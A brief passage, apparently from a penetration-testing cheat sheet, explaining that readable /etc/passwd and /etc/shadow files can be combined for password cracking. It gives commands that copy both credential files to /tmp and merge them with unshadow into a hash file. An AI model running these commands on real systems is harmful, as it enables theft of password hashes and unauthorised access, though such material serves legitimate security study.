-- -
If you are able to read both `/etc/passwd` and `/etc/shadow` then you can combine the two and try cracking the password.
```bash
cp /etc/passwd /tmp/passwd.bak
cp /etc/shadow /tmp/shadow.bak
unshadow /tmp/passwd.bak /tmp/shadow.bak > /tmp/unshadowed.hashes
```
